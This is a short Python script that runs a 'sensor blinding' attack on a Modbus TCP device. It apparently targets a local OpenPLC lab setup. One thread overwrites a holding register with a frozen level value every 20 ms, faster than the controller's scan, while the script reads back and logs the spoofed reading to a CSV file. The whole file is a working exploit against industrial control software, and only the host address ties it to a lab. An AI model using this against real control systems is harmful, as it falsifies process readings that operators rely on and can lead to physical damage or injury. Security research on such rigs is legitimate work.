from pymodbus.client import ModbusTcpClient
import time, datetime, csv, threading

HOST = 'localhost'
PORT = 5021
UNIT = 1
FROZEN_VALUE = 53
DURATION = 60  # seconds

client_write = ModbusTcpClient(HOST, port=PORT)
client_write.connect()
client_read = ModbusTcpClient(HOST, port=PORT)
client_read.connect()

stop_flag = {'stop': False}

def hammer():
    while not stop_flag['stop']:
        client_write.write_register(0, FROZEN_VALUE, device_id=UNIT)
        time.sleep(0.02)  # write every 20ms, faster than the 100ms scan

t = threading.Thread(target=hammer)
t.start()

log = []
t_start = datetime.datetime.utcnow().isoformat()
print(f"=== SENSOR BLINDING v2 START: {t_start} (hammering every 20ms) ===")

for i in range(int(DURATION/2)):
    time.sleep(2)
    reg = client_read.read_holding_registers(0, count=1, device_id=UNIT)
    reported = reg.registers[0]
    ts = datetime.datetime.utcnow().isoformat()
    log.append((ts, reported))
    print(f"{ts}  reported_level={reported}")

stop_flag['stop'] = True
t.join()

with open('attack_sensor_blinding_v2_log.csv', 'w', newline='') as f:
    w = csv.writer(f)
    w.writerow(['timestamp','reported_level'])
    w.writerows(log)

client_write.close()
client_read.close()
print("=== DONE — now check OpenPLC web UI live variable page for TRUE NiveauSimu ===")
